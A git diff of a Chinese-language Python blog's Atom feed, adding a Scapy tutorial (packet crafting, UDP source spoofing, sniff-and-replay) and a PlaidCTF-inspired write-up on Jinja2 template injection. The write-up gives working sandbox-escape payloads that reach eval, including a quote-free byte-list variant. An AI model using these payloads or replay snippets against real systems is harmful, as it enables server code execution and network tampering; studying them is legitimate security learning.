@@ -1,6 +1,103 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>littlezz's Blog</title><link href="http://littlezz.github.io/" rel="alternate"></link><link href="http://littlezz.github.io/feeds/python.atom.xml" rel="self"></link><id>http://littlezz.github.io/</id><updated>2017-05-01T00:00:00+08:00</updated><entry><title>jinja2 模板注入绕过引号任意代码执行</title><link href="http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html" rel="alternate"></link><updated>2017-05-01T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2017-05-01:jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html</id><summary type="html">&lt;h3 id="intro"&gt;&lt;a name="user-content-intro" href="#intro" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;intro&lt;/h3&gt;
-&lt;p&gt;不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。&lt;del&gt;（当然最后是用其他的方法&lt;/del&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>littlezz's Blog - Python</title><link href="http://littlezz.github.io/" rel="alternate"></link><link href="http://littlezz.github.io/feeds/python.atom.xml" rel="self"></link><id>http://littlezz.github.io/</id><updated>2017-06-30T00:00:00+08:00</updated><entry><title>Scapy 使用总结</title><link href="http://littlezz.github.io/scapy-shi-yong-zong-jie.html" rel="alternate"></link><published>2017-06-30T00:00:00+08:00</published><updated>2017-06-30T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2017-06-30:/scapy-shi-yong-zong-jie.html</id><summary type="html">&lt;h3&gt;构造包以及一些网络基础知识&lt;/h3&gt;
+&lt;p&gt;载入所有函数&lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;或者从命令行输入&lt;code&gt;sudo scapy&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;scapy 可以控制各个层的数据， 使用&lt;code&gt;/&lt;/code&gt;符号拼合各个层构造出一个包&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.1.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.1.2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;UDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5555&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;udp data&amp;#39;&lt;/span&gt;
+
+&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;IP层控制 ip 地址， 对于 udp 包来说不需要握手可以伪造源地址。UDP 是和 TCP 平行的一层， 控制发包的源端口和目标端口。&lt;br&gt;
+再后面一层是要发送的数据。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;packet.show()&lt;/code&gt; 工整的打印包数据&lt;/p&gt;
+&lt;h3&gt;发送包&lt;/h3&gt;
+&lt;p&gt;scapy 有几种发包的方式。&lt;br&gt;
+&lt;code&gt;send&lt;/code&gt;用于发送 layer3 层的包， 也就是程序自动处理链路层上面的 mac 地址， 如果想要自定义 mac 地址， 需要使用 sendp， 这是在 layer2 层发包， 这个时候可以自定义 mac 地址。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;send(packet)
+sendp(p, iface=&amp;#39;en0&amp;#39;)
+packet = Ether(src=RandMAC())/IP(dst=&amp;#39;192.168.31.1 …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;h3&gt;构造包以及一些网络基础知识&lt;/h3&gt;
+&lt;p&gt;载入所有函数&lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;或者从命令行输入&lt;code&gt;sudo scapy&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;scapy 可以控制各个层的数据， 使用&lt;code&gt;/&lt;/code&gt;符号拼合各个层构造出一个包&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.1.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.1.2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="n"&gt;UDP&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5555&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dport&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="sa"&gt;b&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;udp data&amp;#39;&lt;/span&gt;
+
+&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;show&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;IP层控制 ip 地址， 对于 udp 包来说不需要握手可以伪造源地址。UDP 是和 TCP 平行的一层， 控制发包的源端口和目标端口。&lt;br&gt;
+再后面一层是要发送的数据。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;packet.show()&lt;/code&gt; 工整的打印包数据&lt;/p&gt;
+&lt;h3&gt;发送包&lt;/h3&gt;
+&lt;p&gt;scapy 有几种发包的方式。&lt;br&gt;
+&lt;code&gt;send&lt;/code&gt;用于发送 layer3 层的包， 也就是程序自动处理链路层上面的 mac 地址， 如果想要自定义 mac 地址， 需要使用 sendp， 这是在 layer2 层发包， 这个时候可以自定义 mac 地址。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;send(packet)
+sendp(p, iface=&amp;#39;en0&amp;#39;)
+packet = Ether(src=RandMAC())/IP(dst=&amp;#39;192.168.31.1&amp;#39;)/UDP(dport=33331)/b&amp;#39;message&amp;#39;
+sendp(packet)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;code&gt;sendp&lt;/code&gt;可以指定发送的 iface。同时可以构造包的时候加入构造&lt;code&gt;Ether()&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;UDP广播&lt;/h3&gt;
+&lt;p&gt;子网内的机器在接受数据时是这样一个流程。&lt;br&gt;
+当数据包从网卡流过的时候， 网卡检查数据包的目标 mac 地址是否包含于自己等待的地址中（既网卡可以监听多个 mac 地址）， 符合就吧数据包拷贝一份向上层传输， 之后检查目标 IP 是否和自己监听的 ip 地址之一符合， 如果符合再交由上层处理， 如果不符合， 则看自己是否配置了路由功能， 然后根据路由表选择出口， 如果没有就从默认路由出去。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;之所以有 ip 和 mac 之分， 是因为 mac 地址的表示是48位的， 而网络协议的 ip 是32位的。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;所以在进行广播的时候， 把目标 mac 地址设置为&lt;code&gt;ff:ff:ff:ff:ff:ff&lt;/code&gt;, 对于绝大部分机器网卡都会接受这个地址。&lt;/p&gt;
+&lt;p&gt;一种是受限广播， 目标 ip 设置为&lt;code&gt;255.255.255.255&lt;/code&gt;， mac 地址设置为&lt;code&gt;ff:ff:ff:ff:ff:ff&lt;/code&gt;， 这种方式路由器不对目的 ip 为&lt;code&gt;255.255.255.255&lt;/code&gt; 进行转发，改数据报只在该子网中出现。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;另一种是指向子网的广播， &lt;code&gt;xxx.xxx.xxx.255&lt;/code&gt;， 数据包会被转发到该子网内广播。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;在 scapy 中， 可以直接把地址设置为&lt;code&gt;255.255.255.255&lt;/code&gt;来广播， 但是会得到&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;WARNING: Mac address to reach destination not found. Using broadcast.&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这是因为使用 &lt;code&gt;send&lt;/code&gt; 函数的缘故， 这个函数作用于 layer3 ， 自动组装了 layer2 层的东西， 目的 mac 地址这个时候就会在 arp 表中查询， 然而广播地址的 mac 地址是查不到的， 这个时候它就会提示程序自动把目的地址mac设置成了广播用的 mac&lt;/p&gt;
+&lt;h4&gt;solution&lt;/h4&gt;
+&lt;p&gt;使用&lt;code&gt;sendp&lt;/code&gt;来发送包， 手动设置packet &lt;code&gt;Ether&lt;/code&gt;的 &lt;code&gt;dst&lt;/code&gt; 地址&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;packet = Ether(dst=&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;)/IP(dst=&amp;#39;192.168.31.255&amp;#39;)/UDP(dport=33331)/b&amp;#39;message&amp;#39;
+sendp(packet)
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;值得注意的是， &lt;code&gt;sendp&lt;/code&gt;是可以使用指定的 interface 来发送包，默认情况下使用&lt;code&gt;conf.iface&lt;/code&gt;的设备&lt;/p&gt;
+&lt;h3&gt;重放攻击&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;sniff&lt;/code&gt;用于监听网络流量， sniff 是阻塞的，可以使用回调函数来处理每一个捕获到的包。  同时可以使用 filter 参数过滤要捕获的包，也可以指定用于监听的 interface， 默认使用所有设备来监听&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;filter 的语法和 tcpdump 中用于过滤的语法一样， 可以使用&lt;code&gt;man pcap-filter&lt;/code&gt;查看详细的内容。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sniff(filter=&amp;#39;udp dst port 2333&amp;#39;, prn=lamda pkt: pkt.show())
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;这段代码循环监听 目标端口为2333的 udp 包， 然后回调程序吧这个包展示出来。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;之后可以吧收到的包再发出去， 完成一次重放（UDP）&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sniff(prn=lambda pkt:sendp(pkt))
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;如果是 tcp 的重放，需要修改 ack。&lt;br&gt;
+&lt;/p&gt;</content><category term="python"></category><category term="小结"></category></entry><entry><title>jinja2 模板注入绕过引号任意代码执行</title><link href="http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html" rel="alternate"></link><published>2017-05-01T00:00:00+08:00</published><updated>2017-05-01T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2017-05-01:/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html</id><summary type="html">&lt;h3&gt;intro&lt;/h3&gt;
+&lt;p&gt;不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。~~（当然最后是用其他的方法~~&lt;/p&gt;
 &lt;p&gt;后来想了一下绕过引号的方法。&lt;/p&gt;
 &lt;p&gt;首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是&lt;code&gt;__buildtins__&lt;/code&gt;, 然后找出 &lt;code&gt;eval&lt;/code&gt;进行任意代码执行， 绕过沙盒的限制&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#! python3&lt;/span&gt;
@@ -32,7 +129,41 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3 id="_1"&gt;&lt;a name="user-content-_1" href="#_1" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;绕过引号&lt;/h3&gt;
+&lt;h3&gt;绕过引号&lt;/h3&gt;
+&lt;p&gt;一般情况下， &lt;code&gt;%&lt;/code&gt;会被过滤， 但是如果引号也被过滤的话怎么构造出 …&lt;/p&gt;</summary><content type="html">&lt;h3&gt;intro&lt;/h3&gt;
+&lt;p&gt;不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。~~（当然最后是用其他的方法~~&lt;/p&gt;
+&lt;p&gt;后来想了一下绕过引号的方法。&lt;/p&gt;
+&lt;p&gt;首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是&lt;code&gt;__buildtins__&lt;/code&gt;, 然后找出 &lt;code&gt;eval&lt;/code&gt;进行任意代码执行， 绕过沙盒的限制&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#! python3&lt;/span&gt;
+
+&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;jinja2&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;
+&lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{}&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{{[].__class__}}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="c1"&gt;#output &amp;quot;&amp;lt;class &amp;#39;list&amp;#39;&amp;gt;&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;我们可以通过这种方法调用自带的函数或者对象， 通过&lt;code&gt;subclasses&lt;/code&gt; 找到更加多的类&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__base__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__subclasses__&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+
+&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;([]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__base__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__subclasses__&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;span class="c1"&gt;#output type&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;之后利用其中的 &lt;code&gt;catch_warnings&lt;/code&gt; 访问 globals 定位出 &lt;code&gt;eval&lt;/code&gt;， 然后进行任意代码执行。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#python3 &lt;/span&gt;
+
+&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;146&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="vm"&gt;__class__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__base__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__subclasses__&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;166&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;146&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;warnings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;catch_warnings&lt;/span&gt;
+
+&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;153&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{{[].__class__.__base__.__subclasses__()[166].__init__.__g&lt;/span&gt;
+     &lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;lobals__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__builtins__&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1+1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)}}&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;).render()&lt;/span&gt;
+&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;153&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;绕过引号&lt;/h3&gt;
 &lt;p&gt;一般情况下， &lt;code&gt;%&lt;/code&gt;会被过滤， 但是如果引号也被过滤的话怎么构造出 eval 可以执行的字符串呢？&lt;/p&gt;
 &lt;p&gt;特别说明的是 &lt;code&gt;chr&lt;/code&gt; 是没有办法在模板中调用的。因为在沙盒中这个函数是不存在的。（&lt;code&gt;chr&lt;/code&gt;？不存在的。）&lt;/p&gt;
 &lt;p&gt;我们可以使用数字列表转化成字节流， 之后转化成字符串的方法。&lt;/p&gt;
@@ -47,7 +178,7 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h4 id="python3"&gt;&lt;a name="user-content-python3" href="#python3" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;python3&lt;/h4&gt;
+&lt;h4&gt;python3&lt;/h4&gt;
 &lt;p&gt;利用：&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;jinja2&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;
 
@@ -64,7 +195,7 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h4 id="python2"&gt;&lt;a name="user-content-python2" href="#python2" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;python2&lt;/h4&gt;
+&lt;h4&gt;python2&lt;/h4&gt;
 &lt;p&gt;python2 的&lt;code&gt;catch_warnings&lt;/code&gt;在&lt;code&gt;[59]&lt;/code&gt;的位置， 另外 python2 的 eval 不接受字节流， 需要特别调用&lt;code&gt;__str__&lt;/code&gt;方法来转化成字符串。其余和 python3相同。&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__.__builtins__.eval([].__class__.__base__.__subclasses__()[6]([95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 115, 121, 115, 34, 41, 46, 118, 101, 114, 115, 105, 111, 110]).__str__())}}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
 
@@ -72,17 +203,19 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
-&lt;p&gt;2017-05-01 20:33:47&lt;/p&gt;</summary><category term="python"></category><category term="小结"></category></entry><entry><title>Python打包时添加非代码文件的坑</title><link href="http://littlezz.github.io/pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html" rel="alternate"></link><updated>2016-12-12T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-12-12:pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html</id><summary type="html">&lt;p&gt;对于 Python 的打包， 通常有两种， 一种是对源文件打包， 一种是安装包， 既在上传 pypi 的时候一般会执行&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;2017-05-01 20:33:47&lt;/p&gt;</content><category term="python"></category><category term="小结"></category></entry><entry><title>Python打包时添加非代码文件的坑</title><link href="http://littlezz.github.io/pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html" rel="alternate"></link><published>2016-12-12T00:00:00+08:00</published><updated>2016-12-12T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-12-12:/pythonda-bao-shi-tian-jia-fei-dai-ma-wen-jian-de-keng.html</id><summary type="html">&lt;p&gt;对于 Python 的打包， 通常有两种， 一种是对源文件打包， 一种是安装包， 既在上传 pypi 的时候一般会执行&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python3 setup.py sdist bdist_wheel
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;使用pip安装的时候一般是安装bdist打包出来的文件。&lt;/p&gt;
-&lt;p&gt;关于在打包中加入非程序文件， 有几种方法， 一种是在 MANIFEST.in 中加入， 对于 setup.py 中也提供了&lt;code&gt;package_data&lt;/code&gt;参数， 另外对于 setuptools 还提供了特别的 &lt;code&gt;include_package_data&lt;/code&gt;的参数， 接下来介绍这些参数的意义和怎么用。  &lt;/p&gt;
-&lt;h2 id="manifestin"&gt;&lt;a name="user-content-manifestin" href="#manifestin" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;MANIFEST.in&lt;/h2&gt;
+&lt;p&gt;关于在打包中加入非程序文件， 有几种方法， 一种是在 MANIFEST.in 中加入， 对于 setup.py 中也提供了&lt;code&gt;package_data&lt;/code&gt;参数， 另外对于 setuptools 还提供了特别的 &lt;code&gt;include_package_data&lt;/code&gt;的参数， 接下来介绍这些参数的意义和怎么用。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;MANIFEST.in&lt;/h2&gt;
 &lt;p&gt;MANIFEST.in文件是针对 源文件打包 的， 当需要把非程序文件， 包括README， css或者test文件等加入时， 在MANIFEST.in中指定， 用于生成MANIFEST&lt;/p&gt;
-&lt;p&gt;MIANIFEST会暗中自动寻找以下的文件：  &lt;/p&gt;
+&lt;p&gt;MIANIFEST会暗中自动寻找以下的文件：&lt;br&gt;
+&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;所有&lt;code&gt;py_modules&lt;/code&gt; 和 &lt;code&gt;packages&lt;/code&gt;中没有明确说明的python文件 &lt;/li&gt;
 &lt;li&gt;ext_modules 或 libraries选项中指明的C文件&lt;/li&gt;
@@ -92,40 +225,95 @@
 &lt;li&gt;&lt;code&gt;package_data&lt;/code&gt;中指明的文件&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;data_files&lt;/code&gt;中指明的文件&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id="package_data"&gt;&lt;a name="user-content-package_data" href="#package_data" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;package_data&lt;/h2&gt;
-&lt;p&gt;&lt;code&gt;package_data&lt;/code&gt;是在setup.py中的参数， 用于控制安装包里面包含的文件。&lt;br /&gt;
-应该这样理解， MANIFEST 控制 sdist 包含的内容， package_data控制bdist包含的内容。  &lt;/p&gt;
-&lt;p&gt;一般情况是， 对源文件打包里面一般包含README， tests这些， 但是对于安装包这不需要。  所以分开设置。  &lt;/p&gt;
-&lt;h2 id="include_package_data"&gt;&lt;a name="user-content-include_package_data" href="#include_package_data" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;include_package_data&lt;/h2&gt;
+&lt;h2&gt;package_data&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;package_data&lt;/code&gt;是在setup.py中的参数， 用于控制安装包里面包含的文件。&lt;br&gt;
+应该这样理解， MANIFEST 控制 sdist 包含的内容， package_data控制bdist包含的内容。&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;一般情况是， 对源文件打包里面一般包含README， tests这些， 但是对于安装包这不需要。  所以分开设置。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;include_package_data&lt;/h2&gt;
+&lt;p&gt;坑就是指 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;对于 Python 的打包， 通常有两种， 一种是对源文件打包， 一种是安装包， 既在上传 pypi 的时候一般会执行&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python3 setup.py sdist bdist_wheel
+&lt;/pre&gt;&lt;/div&gt;
+
+
